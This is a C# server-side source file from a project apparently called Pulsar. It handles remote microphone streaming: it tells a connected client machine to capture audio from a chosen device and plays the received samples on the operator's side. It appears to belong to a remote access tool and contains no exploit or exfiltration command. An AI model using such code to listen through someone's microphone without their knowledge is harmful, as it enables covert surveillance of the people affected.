using NAudio.Wave;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using Pulsar.Common.Enums;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the microphone.
    /// </summary>
    public class AudioHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming microphone bits.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Represents the method that will handle microphone changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="device">All currently available microphones.</param>
        public delegate void MicrophoneChangedEventHandler(object sender, List<Tuple<int, string>> device);

        /// <summary>
        /// Raised when a microphone changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event MicrophoneChangedEventHandler MicrophoneChanged;

        /// <summary>
        /// Represents the method that will handle audio data reception.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="audioData">The raw audio data bytes.</param>
        public delegate void AudioDataReceivedEventHandler(object sender, byte[] audioData);

        /// <summary>
        /// Raised when audio data is received from the remote microphone.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event AudioDataReceivedEventHandler AudioDataReceived;

        public event EventHandler<MediaStreamStatusEventArgs> StreamStatusChanged;

        public sealed class MediaStreamStatusEventArgs : EventArgs
        {
            public MediaStreamStatus Status { get; }
            public string ErrorCode { get; }
            public string ErrorMessage { get; }

            public MediaStreamStatusEventArgs(MediaStreamStatus status, string errorCode, string errorMessage)
            {
                Status = status;
                ErrorCode = errorCode;
                ErrorMessage = errorMessage;
            }
        }

        /// <summary>
        /// Reports changed microphones.
        /// </summary>
        /// <param name="devices">All currently available microphones.</param>
        private void OnMicrophoneChanged(List<Tuple<int, string>> devices)
        {
            SynchronizationContext.Post(dvce =>
            {
                var handler = MicrophoneChanged;
                handler?.Invoke(this, (List<Tuple<int, string>>)dvce);
            }, devices);
        }

        /// <summary>
        /// Reports received audio data.
        /// </summary>
        /// <param name="audioData">The raw audio data bytes.</param>
        private void OnAudioDataReceived(byte[] audioData)
        {
            SynchronizationContext.Post(data =>
            {
                var handler = AudioDataReceived;
                handler?.Invoke(this, (byte[])data);
            }, audioData);
        }

        private void OnStreamStatusChanged(MediaStreamStatus status, string errorCode, string errorMessage)
        {
            var handler = StreamStatusChanged;
            if (handler == null)
                return;

            SynchronizationContext.Post(_ =>
            {
                handler?.Invoke(this, new MediaStreamStatusEventArgs(status, errorCode, errorMessage));
            }, null);
        }

        /// <summary>
        /// The client which is associated with this audio handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="AudioHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public AudioHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <summary>
        /// Receives the bytes.
        /// </summary>
        private BufferedWaveProvider _provider;

        /// <summary>
        /// Plays the received audio
        /// </summary>
        private WaveOut _audioStream;

        /// <summary>
        /// Holds the desired bitrate
        /// </summary>
        public int _bitrate = 44100;
        private string _sessionId;
        private int _channels = 1;
        private long _lastSequence = 0;
        private int _deviceIndex = -1;
        private bool _disposed;

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetMicrophoneResponse || message is GetMicrophoneDeviceResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophoneResponse d:
                    Execute(sender, d);
                    break;

                case GetMicrophoneDeviceResponse m:
                    Execute(sender, m);
                    break;
            }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="device">The device to receive audio from.</param>
        public void BeginReceiveAudio(int device)
        {
            lock (_syncLock)
            {
                if (_disposed)
                    return;

                try
                {
                    if (IsStarted)
                    {
                        try
                        {
                            _client.Send(new GetMicrophone
                            {
                                DeviceIndex = device,
                                Destroy = true,
                                SessionId = _sessionId
                            });
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error stopping existing microphone stream: {ex.Message}");
                        }
                    }

                    DisposePlaybackLocked();

                    IsStarted = true;
                    _deviceIndex = device;
                    _sessionId = Guid.NewGuid().ToString("N");
                    Interlocked.Exchange(ref _lastSequence, 0);
                    _channels = 1;
                    EnsurePlaybackLocked(_channels);
                    _client.Send(new GetMicrophone
                    {
                        CreateNew = true,
                        DeviceIndex = device,
                        Bitrate = _bitrate,
                        Channels = _channels,
                        SessionId = _sessionId
                    });
                }
                catch (NAudio.MmException ex)
                {
                    // Handle the exception gracefully
                    IsStarted = false;
                    DisposePlaybackLocked();
                    _sessionId = null;
                    _deviceIndex = -1;
                    OnStreamStatusChanged(MediaStreamStatus.Unavailable, "MEDIA_OUTPUT_ERROR", ex.Message);
                    System.Windows.Forms.MessageBox.Show($"Error initializing audio device: {ex.Message}",
                        "Audio Error",
                        System.Windows.Forms.MessageBoxButtons.OK,
                        System.Windows.Forms.MessageBoxIcon.Error);
                }
                catch (Exception ex)
                {
                    // Handle any other unexpected exceptions
                    IsStarted = false;
                    DisposePlaybackLocked();
                    _sessionId = null;
                    _deviceIndex = -1;
                    OnStreamStatusChanged(MediaStreamStatus.Error, "MEDIA_OUTPUT_ERROR", ex.Message);
                    System.Windows.Forms.MessageBox.Show($"An unexpected error occurred: {ex.Message}",
                        "Audio Error",
                        System.Windows.Forms.MessageBoxButtons.OK,
                        System.Windows.Forms.MessageBoxIcon.Error);
                }
            }
        }

        /// <summary>
        /// Ends receiving audio from the client.
        /// </summary>
        /// /// <param name="device">The device to stop.</param>
        public void EndReceiveAudio(int device)
        {
            lock (_syncLock)
            {
                if (_disposed)
                    return;

                try
                {
                    int stopDevice = _deviceIndex >= 0 ? _deviceIndex : device;
                    string stopSession = _sessionId;
                    _client.Send(new GetMicrophone
                    {
                        DeviceIndex = stopDevice,
                        Destroy = true,
                        SessionId = stopSession
                    });
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error sending destroy message: {ex.Message}");
                }
                finally
                {
                    IsStarted = false;
                    DisposePlaybackLocked();
                    _sessionId = null;
                    _deviceIndex = -1;
                    Interlocked.Exchange(ref _lastSequence, 0);
                    OnStreamStatusChanged(MediaStreamStatus.Stopped, null, null);
                }
            }
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshMicrophones()
        {
            lock (_syncLock)
            {
                if (_disposed)
                    return;
            }
            _client.Send(new GetMicrophoneDevice());
        }

        private void Execute(ISender client, GetMicrophoneResponse message)
        {
            lock (_syncLock)
            {
                try
                {
                    if (_disposed || !IsStarted)
                        return;

                    if (!string.IsNullOrWhiteSpace(_sessionId) &&
                        !string.Equals(_sessionId, message.SessionId, StringComparison.Ordinal))
                    {
                        Debug.WriteLine("Ignoring stale microphone session response.");
                        return;
                    }

                    if (_deviceIndex >= 0 && message.Device >= 0 && message.Device != _deviceIndex)
                    {
                        Debug.WriteLine("Ignoring microphone response from a stale device.");
                        return;
                    }

                    if (message.Status == MediaStreamStatus.Stopped)
                    {
                        IsStarted = false;
                        DisposePlaybackLocked();
                        _sessionId = null;
                        _deviceIndex = -1;
                        Interlocked.Exchange(ref _lastSequence, 0);
                        OnStreamStatusChanged(MediaStreamStatus.Stopped, null, null);
                        return;
                    }

                    if (message.Status != MediaStreamStatus.Active)
                    {
                        Debug.WriteLine($"Microphone stream error: {message.ErrorCode}: {message.ErrorMessage}");
                        IsStarted = false;
                        DisposePlaybackLocked();
                        _sessionId = null;
                        _deviceIndex = -1;
                        Interlocked.Exchange(ref _lastSequence, 0);
                        OnStreamStatusChanged(message.Status, message.ErrorCode, message.ErrorMessage);
                        return;
                    }

                    if (message.Sequence > 0 &&
                        Interlocked.Read(ref _lastSequence) >= message.Sequence)
                    {
                        return;
                    }
                    if (message.Sequence > 0)
                    {
                        Interlocked.Exchange(ref _lastSequence, message.Sequence);
                    }

                    OnStreamStatusChanged(MediaStreamStatus.Active, null, null);

                    if (message?.Audio == null || message.Audio.Length == 0)
                    {
                        return;
                    }

                    int responseChannels = Math.Max(1, Math.Min(2, message.Channels));
                    if (_channels != responseChannels)
                        EnsurePlaybackLocked(responseChannels);

                    if (_provider == null)
                    {
                        return;
                    }

                    if (_provider.BufferedBytes > _provider.BufferLength / 2)
                        _provider.ClearBuffer();

                    if ((message.Audio.Length & 1) != 0)
                        return;

                    OnAudioDataReceived(message.Audio);

                    _provider.AddSamples(message.Audio, 0, message.Audio.Length);
                    if (_audioStream.PlaybackState != PlaybackState.Playing)
                        _audioStream.Play();
                    message.Audio = null;
                }
                catch (ObjectDisposedException ex)
                {
                    Debug.WriteLine($"Audio resources disposed: {ex.Message}");
                    IsStarted = false;
                }
                catch (InvalidOperationException ex)
                {
                    Debug.WriteLine($"Audio stream invalid operation: {ex.Message}");
                    IsStarted = false;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing microphone audio: {ex.Message}");
                }
            }
        }

        private void Execute(ISender client, GetMicrophoneDeviceResponse message)
        {
            OnMicrophoneChanged(message.DeviceInfos);
        }

        private void EnsurePlaybackLocked(int channels)
        {
            channels = Math.Max(1, Math.Min(2, channels));
            if (_provider != null &&
                _provider.WaveFormat.SampleRate == _bitrate &&
                _provider.WaveFormat.Channels == channels)
            {
                _channels = channels;
                return;
            }

            DisposePlaybackLocked();
            _channels = channels;
            _provider = new BufferedWaveProvider(new WaveFormat(_bitrate, _channels))
            {
                BufferDuration = TimeSpan.FromMilliseconds(500),
                DiscardOnBufferOverflow = true
            };
            _audioStream = new WaveOut();
            _audioStream.Init(_provider);
        }

        private void DisposePlaybackLocked()
        {
            if (_provider != null)
            {
                try { _provider.ClearBuffer(); }
                catch (Exception ex) { Debug.WriteLine($"Error clearing microphone buffer: {ex.Message}"); }
            }

            if (_audioStream != null)
            {
                try { _audioStream.Stop(); }
                catch (Exception ex) { Debug.WriteLine($"Error stopping microphone stream: {ex.Message}"); }
                try { _audioStream.Dispose(); }
                catch (Exception ex) { Debug.WriteLine($"Error disposing microphone stream: {ex.Message}"); }
            }

            _audioStream = null;
            _provider = null;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    if (_disposed)
                        return;
                    _disposed = true;
                    try
                    {
                        if (IsStarted && _sessionId != null)
                        {
                            try
                            {
                                _client.Send(new GetMicrophone
                                {
                                    DeviceIndex = _deviceIndex,
                                    Destroy = true,
                                    SessionId = _sessionId
                                });
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error sending microphone stop during dispose: {ex.Message}");
                            }
                        }
                        DisposePlaybackLocked();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error in microphone dispose: {ex.Message}");
                    }
                    finally
                    {
                        IsStarted = false;
                        _sessionId = null;
                        _deviceIndex = -1;
                        Interlocked.Exchange(ref _lastSequence, 0);
                    }
                }
            }
        }
    }
}